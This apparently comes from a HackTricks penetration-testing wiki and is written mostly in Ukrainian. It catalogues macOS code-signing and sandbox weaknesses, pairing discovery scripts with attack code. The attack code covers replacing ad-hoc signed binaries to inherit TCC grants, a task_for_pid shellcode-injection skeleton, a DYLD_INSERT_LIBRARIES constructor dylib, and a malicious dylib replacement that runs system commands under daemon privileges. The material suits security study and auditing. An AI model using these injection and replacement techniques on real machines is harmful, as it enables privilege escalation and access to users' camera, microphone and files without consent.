# macOS Слабкості підпису коду & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Basic Information

**Ad-hoc signing** (`CS_ADHOC`) створює підпис коду з **відсутнім ланцюжком сертифікатів** — це хеш коду без перевірки ідентичності розробника. Походження бінарника неможливо відстежити до будь-якого розробника чи організації.

На Apple Silicon Macs усі виконувані файли принаймні потребують ad-hoc signature. Це означає, що ви знайдете ad-hoc signatures у багатьох інструментах розробки, Homebrew пакетах та сторонніх утилітах.

### Why This Matters

- **Немає перевіреної ідентичності** — бінарник може бути замінений без виявлення перевірками, що базуються на ідентичності
- Сторонні ad-hoc binaries у **привілейованих позиціях** (FDA, daemon, helpers) є пріоритетними цілями
- На деяких конфігураціях ad-hoc signatures можуть **не перевірятися так жорстко**, як developer-signed code
- Ad-hoc signed binaries, які мають **TCC grants**, особливо цінні — ці гранти зберігаються навіть якщо вміст бінарника змінюється (залежить від того, як TCC прив'язала ключ до гранту)

### Discovery
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Атака: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## Процеси, доступні для налагодження (get-task-allow)

### Основна інформація

The **`com.apple.security.get-task-allow`** entitlement (or `CS_GET_TASK_ALLOW` flag) дозволяє **будь-якому процесу приєднатися як налагоджувач**, читати пам'ять, змінювати регістри, ін'єктувати код і контролювати виконання.

This is intended **only for development builds**. Однак деякі сторонні бінарні файли постачаються з цим правом у продуктивних збірках.

> [!CAUTION]
> A production binary with `get-task-allow` is an **instant exploitation primitive**. Any local process can call `task_for_pid()`, get the target's Mach task port, and inject arbitrary code that runs with the target's entitlements, TCC grants, and security context.

### Виявлення
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Атака: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Відсутність перевірки бібліотек + DYLD Environment

### Смертоносна комбінація

Коли бінарний файл має **обидва**:
- `com.apple.security.cs.disable-library-validation` (завантажує будь-яку dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (приймає DYLD змінні оточення)

Це є **гарантований code injection primitive** — `DYLD_INSERT_LIBRARIES` працює бездоганно.

### Виявлення
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Атака: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Тимчасові винятки Sandbox

### Як вони послаблюють Sandbox

Тимчасові винятки Sandbox (`com.apple.security.temporary-exception.*`) створюють дірки в App Sandbox:

| Exception | What It Allows |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Підключатися до системних XPC/Mach сервісів |
| `temporary-exception.files.absolute-path.read-write` | Читати/записувати файли поза контейнером додатка |
| `temporary-exception.iokit-user-client-class` | Відкривати IOKit user-client з'єднання |
| `temporary-exception.shared-preference.read-only` | Читати налаштування інших додатків |
| `temporary-exception.files.home-relative-path.read-write` | Доступ до шляхів відносно `~` |

### Mach-Lookup Exceptions = Sandbox Escape Primitive

The most dangerous exception is **mach-lookup** — it allows a sandboxed app to talk to privileged daemons:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Атака: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Приватні Apple Entitlements

### Що це таке

Entitlements з префіксом `com.apple.private.*` надають доступ до **внутрішніх API Apple**, які не документовані та недоступні стороннім розробникам. Бінарні файли третіх сторін з приватними entitlements отримували їх через enterprise cert, MDM, або розповсюдження поза App Store.

### Небезпечні приватні Entitlements

| Entitlement | Можливість |
|---|---|
| `com.apple.private.tcc.manager` | Повний доступ на читання/запис до бази даних TCC |
| `com.apple.private.tcc.allow` | Доступ до конкретних сервісів TCC |
| `com.apple.private.security.no-sandbox` | Запуск без sandbox |
| `com.apple.private.iokit` | Прямий доступ до драйверів IOKit |
| `com.apple.private.kernel.\*` | Доступ до інтерфейсу ядра |
| `com.apple.private.xpc.launchd.job-label` | Реєстрація/керування завданнями launchd |
| `com.apple.rootless.install` | Запис у шляхи, захищені SIP |

### Виявлення
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Користувацькі профілі Sandbox (SBPL)

### Що це таке

Binaries можуть постачатися з **custom sandbox profiles**, написаними в SBPL (Seatbelt Profile Language). Ці профілі можуть бути більш обмежувальними АБО **менш обмежувальними**, ніж стандартний App Sandbox.

### Аудит користувацьких профілів
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Записувані шляхи бібліотек

### Що це таке

Коли binary завантажує dynamic library з шляху, до якого поточний користувач має **право на запис**, бібліотеку можна замінити на шкідливий код.

### Виявлення
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Атака: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## Посилання

* [Apple Developer — Посібник із підписування коду](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
* [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
* [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
* [The Evil Bit — clear-library-validation](https://theevilbit.github.io/posts/com.apple.private.security.clear-library.validation/)

{{#include ../../../banners/hacktricks-training.md}}
